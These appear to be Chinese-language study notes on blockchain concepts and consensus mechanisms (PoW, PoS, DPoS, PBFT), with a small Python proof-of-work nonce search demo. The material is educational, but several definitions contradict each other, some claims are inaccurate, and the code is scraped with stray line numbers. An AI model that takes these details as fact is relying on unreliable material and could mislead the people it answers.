地址：表示事务中收件人和发件人的唯一标识符，通常表示为公钥或派生自私钥。建议在每个事务中用新生成的地址，防止将交易链接到公共所有者，避免身份识别 事务：区块链的基本单元，表示地址间的值传输 区块：由多个交易和其他元素组成 P2P网络：所有对等点之间的可以彼此通信、发送和接收消息 脚本或程序语言：交易脚本是节点的预定义集合，用于将令牌从一个地址转移到另一个地址，并执行各种其他功能 虚拟机：事务脚本的扩展，可运行图灵完备的代码 状态机：一个区块链可以看作一个状态转换机制 节点：可以生成并验证交易，同时进行挖掘。根据区块链类型及节点分配的角色，还可以执行其他功能 智能合约：智能合约运行于区块链之上，在满足某些条件时封装业务。区块链并不支持智能合约 区块链的特性 分布式一致性：缺少中心信任机制授权的情况下，各方都能达成一致 交易验证：节点发布交易基于预先确定的规则进行验证，有效的交易才能包含在区块中 智能合约平台：区块链定义为一个平台，程序可以运行其上，并代表用户执行业务逻辑 在对等点间传输值：允许通过令牌在用户之间传递值，令牌是值的载体 生成加密货币：是一个可选的特性，为的是激励矿商 智能属性：采用不可撤销的方式将资产与区块链联系起来，使任何人都无权占有、资产完全由个人控制、不可重复使用或双重拥有 安全提供商：基于已证实的加密技术，确保数据的完整性和可用性 不变性：区块链中的记录是不可变的 唯一性：每个交易都是唯一的，且尚未被消费 智能合约：区块链提供了一个有智能合约特性的平台，可视为区块链上的自主程序，可以封装业务逻辑和代码，以便下一步所需。智能合约同时实现了灵活性、可编程性、对于特定业务执行的特定操作，区块链用户可对此加以控制 区块链中的共识 工作量证明机制（PoW） 依赖于：在提出一个网络接受价值之前已经花费饿了足够的计算资源。用于比特币和其他加密货币。 权益证明(PoS) 理念：节点或用户在系统中具有足够的权益。如用户在系统中投入了足够的资金，因此，恶意行为获得的收益将超出执行系统攻击。应用于以太坊区块链中，生成并签订下一个区块的机会随着币龄而增加。 委托权益证明(DPoS) 对PoS的一种创新，每个节点都可以通过投票将交易的验证委托给其他节点。应用于比特股中。 流逝时间证明 使用可信执行环境（TEE）通过可靠的等待时间再领导选举过程中提供随机性和安全性。 基于保证金的共识 希望加入网络的节点在生成区块链之前存入保证金。 重要性证明 依赖于用户在系统中所拥有的权益份额，并监视用户对令牌的使用和移动，以建立信任和重要性级别。 联邦共识和联邦拜占庭共识 应用于恒星共识协议中，保留一组公开信任的对等点，并只传播由大多数受信节点验证的交易。 信誉机制 基于在网络上建立的声誉选择领导者，由其他成员投票实现。 实用拜占庭容错机制(PBFT) 实现了状态机的复制，并对拜占庭节点提供了容错机制。 基于区块链的去中心化 分布式系统：数据和计算是分布在多个节点上，计算不可能以并行方式执行，数据仅可在用户视为单一聚合系统的多个节点上进行复制。 并行系统：计算是由所有节点同步执行。 分布式系统：存在管理整个系统的中央权威机构，控制权分布在许多节点中。 去中心化系统：是节点不依赖与单个主节点的网络类型，且不存在中央权威机构。 去中心化方法存在两种方法实现去中心化：非中介化和竞争 非中介化：不通过中介机构进行相应的活动，或消除中间人或中介机构，如C2C模式；不通过银行转账，而用区块链地址进行直接转账 竞争：一组服务提供者相互竞争，以便被系统选择进而提供有效服务。在区块链系统中，智能合约可以根据声誉、评分、评论和服务质量，从大量的提供者中选择一个外部的数据提供者。当然这并不是完全的去中心化，但允许智能合约根据标准作出自由选择 去中心化流程不是所有的事务都需要去中心化的 去中心化需求条件评估： 去中心化的含义 去中心化系统可以是任何系统 去中心化所需的级别 可以是完全中介化或部分中介化 采用哪种区块链 可以选择比特币、以太坊等 采用哪种安全性机制 原子性机制，确保系统的完整性；声誉机制，支持系统中不同的受信度 区块链和完整的生态圈去中心化操作去中心化的生态系统概览如下： 存储 数据可以直接存储在区块链中，即实现了去中心化操作，但存在一个缺点：区块链不适合存储大量的数据，如图像。 去中心化存储方案： 分布式哈希表（DHT）：应用于BitTorrent，用户不会无限期的保存相关文件，如果节点脱离网络，则节点无法被检索到，除非该节点再次加入到网络，以使文件再次可用。 Inter Planetary File System（IPFS）拥有高可用性和链接稳定性，旨在通过替换HTTP协议提供一个去中心化的万维网。使用Kademlia DHT和merkle DAG（有向无环图）分别提供存储和搜索功能。 激励机制基于Filecoin协议，该协议向使用BitSwap机制存储数据的节点提供激励。 BitSwap机制允许节点保留一个简单的字节账本。 Ethereum包含自身的去中心化和分布式的生态系统，并使用集群存储和whisper协议进行通信。 Maidsafe致力于提供一个去中心化的万维网。 BigChainDB目的是提供一个可伸缩、快速和线性和伸缩的去中心化数据库，而不是传统的文件系统。 通信去中心化网络方案： Internet旨在建立一个去中心化的系统。该模型基于中央权威（服务提供者）的信任，用户并不负责管理其数据，甚至密码也可存储在受信的第三方系统上。有必要以某种方式向个别用户提供管理权限，确保用户可以访问数据，并且不依赖于第三方。（如IPFS） 网状网络：节点间可以直接对话，而不需要像服务提供商那样采用中心枢纽。例如Firechat，允许iphone用户在没有互联网的情况下以点对点的方式直接进行通信。 密码学与基本技术区块链的不可篡改性基于密码学的算法实现 密码学发展简史 密码学数学基础 对称密码机制 非对称密码机制 Hash技术哈希函数用于创建任意长度的输入字符串、固定长度的文摘，所以常用于数字签名和消息认证码中。 SHA256：输入消息大小小于264位。其中，块大小为512位，字大小为32位，输出为256位的文摘。 预处理算法： a) 如果小于512位块尺寸，填充为512位块尺寸。 b) 将消息解析为消息块，确保消息及其填充内容划分为512位的相等快。 c) 设置初始哈希值，表示为8个32位的字，是前8个素数的平方根小数的前32位。 哈希计算步骤： a) 每个消息块依次进行处理，需要64轮才能计算出全部哈希结果。其中，每一轮使用不同的常数，以确保没有两轮处于等同状态。 b) 设置消息轮询。 c) 初始化8个工作变量。 d) 计算中间哈希值。 e) 处理消息并生成输出哈希值。 ​ 在p2p网络下载网络之前，先从可信的源获得文件的Merkle Tree树根。一旦获得了树根，就可以从其他不可信的源获取Merkle tree。通过可信的树根来检查接受到的Merkle Tree。如果Merkle Tree是损坏的或者虚假的，就从其他源获得另一个Merkle Tree，直到获得一个与可信树根匹配的Merkle Tree。 特点： MT大多数是二叉树，也可以多叉树，具有树结构的所有特点 叶子节点的value是数据集合的单元数据或者单元数据HASH 非叶子节点的value是根据它下面所有的叶子节点值，然后按照Hash算法计算而得出的 优点：可以直接下载并立即验证Merkle Tree的一个分支。因为可以将文件切分成小的数据块，这样如果有一块数据损坏，仅仅重新下载这个数据块就行了。 基本密码技术的应用 EC-DH交换密钥 EC-DES签名 共识算法 可参考： [区块链] 共识算法之争(PBFT，Raft，PoW，PoS，DPoS，Ripple) 深入浅出PBFT算法原理 共识机制 区块链的底层由四部分构成 分布式数据库：用来存储以往和将来的交易数据 密码学：公钥私钥体系用来确认交易双方的身份 P2P网络：用来广播和蔓延各类消息（如节点的加入消息、节点失效消息、得到挖矿数据的消息） 共识机制：用来决定节点记账权利 区块链系统的核心是系统节点竞争记账，这个竞争过程称为共识机制 共识机制在区块链中扮演着核心地位，共识机制决定了谁有记账的权利，以及记账权利的选择过程和理由 共识机制：区块链事务达成分布式共识的算法 不同的虚拟货币采用不同的共识机制，常见的共识机制如POW、POS、DPOS、PBFT等 PoWPOW：Proof of work，工作量证明机制 POW工作量证明就是我们所熟悉的挖矿，通过与或运算，计算出一个满足规则的随机数，即获得本次记账权，发出本轮所需要记录的数据，全网其他节点验证后一起存储。这种证明方式的一个显著特征是往往需要很大的工作量才能拿到指定成果，但是这个成果很容易验证 POW工作量证明的三要素：①工作量证明函数 ②Merkle树 ③难度值 ①工作量证明函数1231.输入x可以是任意长度的字符串2.输出结果即H(x)的长度是固定的3.计算H(x)的过程是高效的 免碰撞 函数还需要免碰撞，即不会出现 x ≠ y ，但是 H(x)=H(y)。但是这个特点在理论上并不成立，对于SHA256算法，会有2^256种输出，进行2^256+1次输出，那么根据鸽巢原理，一定会产生一次碰撞。 但是从概率的角度看，随机生成K个数，他们不同的概率为 (N-1)/N × (N-2)/N × …… × (N-(k-2) )/N × (N-(k-1))/N = e-k(k-1)/2N 因此，碰撞的概率为 1-e-k(k-1)/2N 因此，从概率的角度看，sha256进行2^130次输入就会有99%的可能发生一次碰撞 不过，假设一台计算机以每秒10000次的速度进行哈希运算，要经过10^27年才能完成2^128次hash运算 如图为不同位发生hash碰撞的可能性，最右边是发生hash碰撞的可能性，左边是经过多少个数之后可能达到发生的可能性。 隐匿性 对于一个给定的输出结果H(x)，想要逆推出输入x，在计算上是不可能的。 不存在比穷举更好的方法，可以使哈希结果H(x)落在特定范围。 Block Hash = hash(本页内容，Pre Hash，时间戳) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt;&gt;&gt; import hashlib&gt;&gt;&gt; import re&gt;&gt;&gt; def s256(text):... c = hashlib.sha256(text.encode('utf-8'))... return text, c.hexdigest()...&gt;&gt;&gt; s256('hacking')('hacking','42d83a899f20aea7d53614d163ac6e90cf4143919324cee410dd767cf6225bbf')&gt;&gt;&gt; def cal(t, flag):... pj = 0... ans = None... while not None:... s = t + str(pj)... ans = re.match(flag, s256(s)[1])... if ans is None:... print(pj)... pj+=1... else:... print(s256(s))... break&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; flag = "0&#123;0&#125;[a-f0-9]&#123;64&#125;"&gt;&gt;&gt; cal("fuck",flag)('fuck0', '2096b072b572e7b3554ab62b542dee4136e4b3a0243be126918d035ec4a4a727')&gt;&gt;&gt; flag = "0&#123;1&#125;[a-f0-9]&#123;63&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck10', '03fc6bfae9f00fa966431f707507d7a18e201d81d564dba42b96b2a7988f3ca6')&gt;&gt;&gt; flag = "0&#123;2&#125;[a-f0-9]&#123;62&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck448','00ff7469c5332f8f5957f0acb1448d00fa4b2e281065f9202ea549a3a6ff7dba')&gt;&gt;&gt; flag = "0&#123;3&#125;[a-f0-9]&#123;61&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck7703', '0006086f65ce49afbd0479d1094463db1c7385aa1c1cd1ffedc1399404ee4fc9')&gt;&gt;&gt; flag = "0&#123;4&#125;[a-f0-9]&#123;60&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck263273', '000069e2e17d677804f76fb9b79b8f9d7654563a91a77a7d6c75ae30c6963e90')&gt;&gt;&gt; flag = "0&#123;5&#125;[a-f0-9]&#123;59&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck271481', '00000fa9aeacc3e986eaf8b8337d71c67abbd77acfd5cc8b90262f7377fdab7e')&gt;&gt;&gt; flag = "0&#123;6&#125;[a-f0-9]&#123;58&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck9197297', '000000c91683616ac0e361c2eafc66de0757e9d46f819e86d30d2cdae1df4398')&gt;&gt;&gt; flag = "0&#123;7&#125;[a-f0-9]&#123;57&#125;"&gt;&gt;&gt; cal("fuck",flag)...... ②Merkle树Merkle树一般用于完整性验证处理。Merkle哈希树是一类基于哈希值的二叉树或多叉树，其子节点上的值通常为数据库的哈希值，而非叶子节点上的值该将该节点的所有子节点的组合结果的哈希值。将Merkle Root存入区块头里，Merkle Tree 存入区块体里。 节点生成一笔筹币交易，对于4个交易记录L1，L2，L3，L4，分别计算hash(L1)，hash(L2)，hash(L3)，hash(L4)；对于hash0=hash(hash0-0+hash0-1) 和 hash1=hash(hash1-0 + hash1-1)；计算出根节点的hash值top hash，topHash=hash(hash0+hash1)。 然后将Merkle树root的top hash值存入区块链头中，如下图 区块链中的Merkle树为二叉树，用于存储交易信息。每个交易两两配对，构成Merkle树的子节点，进而生成整个Merkle树。Merkle树使得用户可以通过从区块头得到的Merkle树根和别的用户所提供的中间哈希值列表去验证某个交易是否包含在区块中。提供中间哈希值的用户并不需要是可信的，因为伪造区块头的代价很高，而中间哈希值如果伪造的话会导致验证失败。 SPV：简化支付验证（Simplified Payment Verification），轻钱包并不保存完整的区块链，而是只保存每一个区块的区块头。区块体保存了完整的交易信息，而交易信息需要的存储量大部分都是交易头的千倍以上。所以，如果只保存交易头，就可以极大的减少本地客户端存储的区块链信息。 在交易时，发出一个MerkleBlock消息，包含区块头和一条连接目标交易与Merkle根的Merkle路径 若需验证该交易，即可通过其Merkle路径与交易hash确定一个新的Merkle Root，将其与原root相比即可。 参考： Merkle Tree 入门 密码学——Merkle树 假如有交易改变，则整个树枝会发生改变 定位的时间为O(log(n))，即二叉树的查找时间 ③难度值 新难度值 = 旧难度值 * （20160分钟 / 最近的2016个区块花费的时长） 新难度值解析：撇开就难度值，按比特币理想值情况每10分钟出块的速度，过去2016个块的总花费时间接近20160分钟，这样，这个值永远趋于1。 若过去2016个区块花费时长少于20160分，那么这个系数会小于1，否则，会大于1。 难度值越大，越难挖。因为20160分大约为14天，而比特币网络大约14天调整一次难度值。 比特币的难度和出块速度将成反比例适当调整出块速度。 目标值 = 最大目标值 / 难度值 最大目标值：一个固定数（恒量，十六进制前8位0后面56位1，即32bit0）0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF 即前N bit为0 目标值解析：若过去2016个区块花费时长少于20160分，那么难度值会变小，目标值将会被调小些；否则，目标值会被调大。 查找块的平均时间可以通过如下方式计算：time = difficulty * 2**32 / hashrate 难度值 = time (s) * hashrate (hash / s ) / (2**32) 新难度值 / 旧难度值 = 新算力 / 旧算力 如果难度为1的话，大约是每秒钟7 Mhashes https://www.cnblogs.com/zhaoweiwei/p/difficulty.html https://en.bitcoin.it/wiki/Difficulty 12345678例:计算目标值,5min产生一个区块,sha256算法,算力 400M hash/s.一个正确区块被计算,需要进行 (5*60)s * 400M hash/s = 120,000 M hash假如计算一个区块头需要1M hash , 则 计算正确头的几率为 1 / (2^17) ,(120000 ≈ 2^17)所以, (2^(256-17)) / 2^256 == 1 / 2^17所以, 目标值为: 0b0……………………011……444 |-17bit0-||--(256-17)bit-- POW工作量证明流程流程如下图： 生成Merkle根哈希 组装区块头 计算出工作量证明的输出 ！！！：区块头里的随机数即是nonce 1.如上 2.组装区块头：块头将被作为计算出工作量证明输出的一个输入参数，因此第一部计算出来的Merkle根哈希和区块头的其他组成部分组装成区块头 3.计算出工作量证明的输出： ​ i) 工作量证明的输出 = SHA256( SHA256(区块头) ) ​ ii) if （工作量证明的输出 &lt; 目标值 ），证明工作量完成 ​ iii) if （工作量证明的输出 &gt;= 目标值），变更随机数(Nonce)，递归 i 的逻辑，继续与目标值比对 对这个值进行两次SHA256运算，为什么要两次，这是因为SHA1在2017年被攻破，采用的方法是birthday collision attack。社区觉得SHA2被攻破也是时间的问题，而抵御birthday collision attack的有效方法为双重哈希算法，当然这种说法只是网上传言，没有得到具体确认。 客户端产生新的交易，向全网广播 每个节点收到请求，将交易纳入区块 每个节点通过pow工作量证明 当某个节点找到了证明，向全网广播 当且仅当该区块的交易是有效的且在之前中未存在的，其他节点才认同该区块的有效性 接受该区块且在该区块的末尾制造新的区块 节点总是认为最长的链是正确的链，并致力于在最长的链上进行扩展。 如果两个节点同时完成PoW过程并广播了不一样的区块，有的节点收到其中一个，而有的节点先会收到另一个。 这种情况下，首先收到的区块会被节点作为下一个区块添加到链上，同时也会保存后到的区块。 当下一个区块来临时，就会知道哪一个区块是比较长的，然后切换到较长的区块链上。 新交易的广播不一定要到达每一个节点，只要到达足够多的节点，这些节点就会在一定时间内将交易打包到区块中 区块的广播也是允许丢包的，如果节点没有收到某一个区块，当下一个区块到来时，该节点发现新区块的prevHash不是目前最后一个区块，就会去请求丢失的区块 因为做出工作量证明的节点上没有未建块的交易，从而有可能产生空块 POW的优缺点 优点：完全去中心化，节点自由进出 缺点：目前bitcoin已经吸引了全球大部分的算力，其他再用POW共识机制的区块链应用很难获得相同算力来保障自身的安全；挖矿造成大量的资源浪费；共识达成的周期较长，不适合商业应用 POSPOS：权益证明机制（Proof of Stake），是Pow的一种升级共识机制，根据每个节点所占代币的比例和时间，等比例的降低挖矿难度，从而加快找到随机数的速度。 若Pow主要比拼的是算力，那么Pos则是比拼余额。通俗说就是当手里的币越多，挖到一个块的概率越大 POS合格区块可以表述为：F(Timestamp) = Target * Balance，与POW的F(Nonce) &lt; Target 相比，式子左边的搜索空间由Nonce 变成 Timestamp，Nonce值域是无限的，而Timestamp的值域是极其有限的，一个合格的区块时间必须在前一个区块时间的规定范围之内，时间太早或者太超前的区块都不会被其他节点接纳。式子右边的目标值引入一个乘积因子余额，课件余额越大，整体目标值（Target*Balance）越大，越容易找到一个区块。因为Timestamp 有限，POS铸造区块成功率主要与Balance有关。 Peercoin（PPC）PPC是POS的一种具体的实现方式 ​ PPC是从中本聪所创造的BTC衍生出来的一种P2P的电子密码货币，以权益证明（Proof of Stake，以下简称PoS）取代工作量证明（Proof of Work，以下简称PoW）来维护网络安全。在这种混合设计中，PoW主要在最初的采矿阶段起作用。长远来看，PPC网络的安全并不依赖能源的消耗。因此PPC是一种节能而有成本优势的P2P电子密码货币。 ​ PoS是基于币龄(coin age)并由通过与 BTC类似的由每个节点散列运算产生的，只是其搜索空间被限制了。区块链的历史及交易结算是通过一个中心化广播检查机制得到进一步保护。 ​ 要掌握Peercoin的POS机制，需要重点理解Sunny King专门为PPC设计的几个核心概念： Coinage币龄，也叫币天。假如1.5个币存在于区块链中10天，币龄数值为：Coinage = 1.5 * 10 = 15 PPC采用币龄，而不是直接采用余额（Balance）来计算。一个UTXO(未花费的交易输出)一旦被花费，其币龄被清零，新的UTXO币龄从0开始算起 stakeReward权益激励，俗称获得利息，计算公式如下：stakeReward = nCoinAge*33/(365*33+8)*0.01*COIN， 公式可简化未：stakeReward = (0.01 * nCoinAge /365) * COIN 其中，nCoinAge是CoinStake所有输入的币龄总和，由公式可知收益按1%年率计算。理想状态下，假设所有的币全年都参与挖矿，代币总量每年有1%通胀率，这一设计为很多人所诟病，而且，这一设计并不能激励矿工积极参与挖矿以维护区块链的安全，因为如果不考虑手续费，持币用户每隔几个月打开节点铸币，或者实时在线铸币，理论上收益都是一样的。 stakeMinAgePOS系统也存在51%币龄攻击风险，为了增加攻击难度，Sunny King对每一笔UTXO的铸币资格做了最小年龄（stakeMinAge）限制：一个UTXO在区块链存在的时间小于stakeMinAge则没有铸币资格，PPC最小币龄为8小时。 POS2.0黑币社区认为币龄可能会被恶意的节点滥用以获得更高的网络权重并成功实施双花攻击，于是发布POS2.0白皮书，对PPC做了几个细节优化，解决了一些潜在的安全问题，其中最重要的改进是用余额代替币龄，合格区块的条件由： F(Timastamp) &lt; Target * 币数 * 币的年龄 变为： F(Timastamp) &lt; Target * 币数 如此一来，一笔UTXO无论放置多久其锻造区块的能力不变，此举可激励节点必须更多的保持在线进行铸币，提高系统安全性，将攻击途径减少到最低限度，并且能够显著提高网络保持运行的节点数量。 POS3.0黑币社区后来进一步升级，推出POS3.0版本，对交易手续费，难度调整做了一些优化，其中最显著的改变是将1%年利率奖励机制变为固定数额奖励（每个区块固定奖励1.5BLK），此举不但降低代币通胀率（考虑到会有代币永久丢失，低额奖励机制回归总量恒定的设计思路），同时意味着持币节点必须实时在线才能获得收益。 POS的优缺点 优点：在一定程度上缩短了共识达成的时间 缺点：还需要挖矿，本质上没有解决商业应用的痛点 DPoSDPOS：股份授权股份证明（Delegated Proof-Of-Stake） https://blog.csdn.net/liankuaixy/article/details/79820710 比特股（Bitshares）项目于2013年8月开始启动，对区块链做了很多改造，并引入许多新概念和特征，尤其令人眼花缭乱的 Bitshares X、多态数字资产交易平台、资产锚定等新名词，一时令人无比兴奋而又困惑。此时POW和POS都已成功运行许久，彼此优劣已被反复讨论，两大阵营时至今日依然争论不休。按照项目规划，比特股对交易容量和区块速度有极高要求，显然POW或POS都达不到要求，于是比特股发明了一种新的共识机制DPOS，即股份授权股权证明。 DPOS是 PoS 的进化方案，在常规 PoW 和 PoS 中，一大影响效率之处在于任何一个新加入的 Block，都需要被整个网络所有节点做确认。 DPoS 优化方案​ 通过不同的策略，不定时的选中一小群节点，这一小群节点做新区块的创建，验证，签名和相互监督，这样就大幅度的减少了区块创建和确认所需要消耗的时间和算力成本。 DPOS机制涉及的问题 1. 持有股票 直接在交易平台上购买比特股即可 2. 成为代表 成为一名代表，你必须在网络上注册你的公钥，分配到一个32位的特有标识符 3. 授权选票 每个钱包有一个参数设置窗口，在该窗口里用户可以选择一个或更多的代表，并将其分级 一般情况下，用户不会创建特别以投票为目的的交易，因为那将耗费他们一笔交易费 4. 保持代表诚实 每个钱包将显示一个状态指示器，让用户知道他们的代表表现如何 5. 抵抗攻击 在抵抗攻击上，因为前100名代表所获得的权利权是相同的，每名代表都有一份相等的投票权，并且，如果当前记账节点不记账则由下一个记账人记账，因此无法通过获得超过1%的选票而将权力集中到一个单一代表上，毕竟同时收买100给代表的难度很大。同时，每名代表的标识是其公钥而非IP地址，使得DOS攻击目标更为困难（难定位） 6. 代表竞选 选出的代表拥有提出改变网络参数的特权，包括交易费用、区块大小、见证人费用和区块区间 DPOS遵循的基本原则 持股人依据所持股份行使表决权，而不是依赖挖矿竞争记账权 最大化持股人的盈利 最小化维护网络安全的费用 最大化网络的效能 最小化运行网络的成本（带宽、CPU等） DPOS的优缺点 优点： 能耗更低：DPoS机制将节点数量进一步减少，在保证网络安全的前提下，整个网络的能耗进一步降低，网络运行成本最低。 更快的确认速度：每个区块的时间为10秒，一笔交易（在得到6-10个确认后）大概1分钟，一个完整的区块的周期大概仅仅需要数分钟。而PoW机制下产生一个区块需要10分钟，一笔交易完成需要数个小时。 在一定程度上解决了拒绝服务攻击和潜在作恶节点联合作恶的问题。 缺点： 投票的积极性并不高：绝大多数持股人从未参与投票。这是因为投票需要时间、精力以及技能，而这恰恰是大多数投资者所缺乏的。 垄断性高：DPoS延续了PoS的弊端，只有持币者才可以获得区块链奖励，其实这就带来了一种制度性门槛，最终导致DPoS币的流动性大大减少，穷者越穷，富者越富。 PBFTPBFT：实用拜占庭容错算法（Practical Byzantine Fault Tolerance） 以往的区块链项目都以虚拟币为内核，而记录数据的应用不需要币机制模型。这个时候，Hyper Ledger（超级账本）应景而生，它是由Linux基金会组织牵头的项目，是一个旨在推动区块链数字技术和交易验证的开源项目。这个分布式账本技术是完全共享、透明和去中心化的，非常适合于金融行业的应用，以及其他的例如制造、银行、保险、物联网等无数个其他行业。 PBFT是Hyper Ledger中使用的共识算法 https://learnblockchain.cn/2019/08/29/pbft/ https://blog.csdn.net/jfkidear/article/details/81275974 PBFT的算法基本流程假设有f个恶意节点，则保证系统正常运作，需要有2f+1个正常节点，总结点数为3f+1 客户端发送请求给主节点 主节点广播请求给其他节点，节点执行pbft算法的三阶段共识流程 节点处理完三阶段流程后，返回消息给客户端 客户端收到来自f+1个节点相同消息后，代表共识已经正确完成 如图： C为Client，pre-prepare为预准备阶段，prepare为准备阶段，commit为提交阶段 R在一个视图里，一个是主节点，其余的都叫做备份节点，如图主节点为0，即Client首先请求主节点负责将客户端的请求排好序，然后按序发给备份节点 但是主节点可能是拜占庭的：他可能会给不同的请求编上相同的序号，或者不去分配序号，后者让相邻序号不连续。 备份节点应当有职责主动检查这些序号的合法性，并能通过timeout机制检测到主节点是否已经宕机。 当出现异常情况下，就会出发视图更换view change协议来选举出新的主节点 Requset阶段在此阶段，客户端c向主节点p发送请求，&lt;Request，operation，timestamp，clientID&gt; operation：为请求具体操作 timestamp：请求时客户端追加的时间戳 clientID：客户端标识 Requset：包含消息内容message，以及信息摘要d(message) 客户端对请求进行签名 PBFT算法预备（Pre-Prepare）在预准备阶段，主节点对签名进行校验，并分配一个序列号n给收到的请求，然后向所有备份节点群发预准备消息，预准备消息的格式为：\&lt; &lt;Pre-Prepare，v，n，d&gt; ， m &gt; v是视图编号 n是序列号 m是客户端发送的请求消息 d是请求消息m的摘要 预准备消息的目的是作为一种证明，确定该请求是在视图v中被赋予了序号n 在视图变更的过程中可以追索请求 请求本身是不包含在预准备消息中，这样能使预准备消息足够小 Prepare当节点收到pre-prepare消息后，会选择接收与否 满足下列条件时，各个备份节点才会接收一个预准备消息：①请求和预准备消息的签名正确，并且d与m的摘要一致；②当前视图编号是v；③该备份节点从未在视图v中接收过序号为n但是摘要d不同的消息m；④预准备消息的序号n必须在水线上下限h和H之间，水线存在的意义在于防止一个失效节点用一个很大的序号消耗序号空间。 如果备份节点i接受了预准备消息\&lt; &lt;Pre-Prepare，v，n，d&gt; ， m &gt;，则进入准备阶段。 在准备阶段的同时，该节点向所有副本节点发送准备消息 \&lt; Prepare，v，n，d，i &gt;，并且将预准备消息和准备消息写入自己的消息日志，可丢弃非法请求（即非法预准备消息） 节点（包括主节点）收到prepare消息后，进行验证prepare消息签名是否正确，视图编号是否一致，消息序号是否满足水线限制，若验证通过则将消息写入消息日志中。 副本节点i将（m，v，n，i）记入消息日志中，其中m是请求内容，预准备消息m在视图v中的编号n，以及2f个从不同副本节点收到的与预准备消息一致的准备消息 每个副本节点验证预准备和准备消息的一致性主要检查：视图编号v、消息序号n和摘要d Commit当prepared (m,v,n,i)条件为真的时候， 副本i生成确认消息 追加到本地消息日志文件 将确认消息向其他副本节点 广播进入了确认阶段 &lt; COMMIT，v，n，D(m)，i&gt; 每个副本节点接收Commit消息的条件是： Commit消息签名正确 上一阶段请求的摘要也是D(m) 消息的视图编号与节点的当前视图编号一致 消息的序号n满足水线条件，在h和H之间 一旦确认消息的接受条件满足了，则该副本节点将确认消息写入消息日志中 当节点收到2f+1（包括自身）个不同节点发送过来的Commit消息之后，进入Commit-local(m，v，n)状态，且所有序号小于n的请求都被处理，则执行客户端请求m中所要求的服务操作 保证在节点中提交的任意一个客户端请求，最终哦都会在另外2f个节点中被提交到本地的，并确保所有正常节点以同样顺序执行所有请求，这样就保证了算法的正确性 Reply同时将执行结果发送给客户端 \，r为请求操作结果 如果客户端收到f+1个相同的Reply消息，说明客户端发起的请求已经达到全网共识，否则客户端需要判断是否重新发送请求给主节点 副本节点会把时间戳比已回复时间戳更小的请求丢弃，以保证请求只会被执行一次 PBFT 检查点 （checkpoint） 如何清除历史请求的记录消息？ 在执行完多条请求K（例如：100条）后执行一次状态同步，即发送CheckPoint消息。&lt;CheckPoint, n, d, i&gt;，n是当前节点所保留的最后一个视图请求编号，d是对当前状态的一个摘要，该CheckPoint消息记录到log中。 如果副本节点i收到了2f+1个验证过的CheckPoint消息，则清除先前日志中的消息，并以n作为当前一个stable checkpoint。 stable checkpoint（稳定检查点）呢？ 大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint 实际上当副本节点i向其他节点发出CheckPoint消息后，其他节点有可能还没有完成K条请求，所以不会立即对i的请求作出响应，它还会按照自己的节奏，向前行进。此时发出的CheckPoint未能形成stable，为防止i的处理请求过快，设置一个高低水位区间[h, H]来解决这个问题， 低水位h等于上一个stable checkpoint编号，高水位H = h + L，其中L是我们指定的数值（如100，或200）， 当副本节点i处理请求超过高水位H时，就会停止脚步，等待stable checkpoint发生变化，再继续前进。 算法视图变更每个副节点维持一个计数器。备份节点在接收到一个有效请求，但是还没有执行它时，会查看计时器是否在运行，如果没有，那么它将启动计时器；当请求被执行时就把计时器停止。 如果计时器超时，将会把视图变更的消息向全网广播。在主节点失效的时候仍然保证系统的活性，防止备份节点无期限地等待请求的执行。需要确保在新的view中如何来延续上一个view最终的状态， 比如给这时来的新请求的编号，比如如何处理上一个view还没来得及完全处理好的请求 计时器超时或发现作恶，副节点生成 view-change 消息 &lt;VIEW-CHANGE,v+1,n,C,P,i&gt;，最近一次的稳定检查点对应的请求的序列号 n，C 是证明该检查点稳定性的 2f+1 个 checkpoint 消息的集合，P 是 Pm 的集合，其中 m 是副节点 i 中的序列号大于 n 的等待提交和执行的客户端请求 m，每个 Pm 包含了如下的信息：①pre-prepare 消息；②2f 个由其他副节点签名的跟 pre-prepare 消息匹配的、有效的 prepare 消息； 此时，节点需要： 记录到本地日志文件中； 同时广播给其他节点； 要求替换掉主节点，变更到下一个视图 v+1； 注意，在视图变更期间，除了 checkpoint、view-change 和 newview 消息之外，备份节点 i 是不会接受其他消息的 在节点收到更换节点消息时，各个节点会收集视图变更信息，并发送确认给 view v+1 中的主节点。 （v+1 中的主节点可能是轮换产生，也可能选举产生） 新的主节点接收到 2f 个有效的 view-change 消息之后，发送自己签名σp’ 的 new-view 消息&lt;NEW-VIEW, v+1, V, O&gt; ，V是主节点收到的2f+1个有效的VIEW-CHANGE消息 ，O是主节点重新发起的未经完成的PRE-PREPARE消息集合 找到所有节点的共同的稳定检查点h。 在h和h+L之间，如果存在n消息，则创建&lt;&lt;PRE-PREPARE, v+1, n, d&gt;, m&gt;消息。否则创建一个空的PRE-PREPARE消息，即：&lt;&lt;PRE-PREPARE, v+1, n, d(null)&gt;, m(null)&gt;, m(null)空消息，d(null)空消息摘要。 对于节点v+1，提议系统内所有节点切换到下一个视图 v+1，同时接受自己成为新的主节点 副节点收到要求将视图变更为 v+1 的 new-vew 消息后，确认消息有效，接受该 new-view 消息，记录到本地消息文件中，同时将视图更换到新的视图v+1，副节点把 new-view 中携带的由新的主节点重新生成的 pre-prepare 消息追加记录到本地的消息日志中，按照检查点协议进行垃圾回收，删除比较老的消息 对于 new-vew 消息中集合 O 中携带的所有由新主节点生成的新的 pre-prepare 消息，备份节点都会生成相应的 prepare 消息，记录到本地日志文件中，转发给其他节点，即对这些未处理的请求在新的视图中重新执行一遍三阶段协议，保证视图切换过程中未处理的请求能够重新被处理。 节点选出一个checkpoint作为新view处理请求的起始状态checkpoint就是当前节点处理的最新请求序号。 checkpoint就是当前节点处理的最新请求序号。 前文已经提到主节点收到请求是会给请求记录编号的。比如一个节点正在共识的一个请求编号是101，那么对于这个节点，它的checkpoint就是101 stable checkpoint（稳定检查点）呢？ 大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable 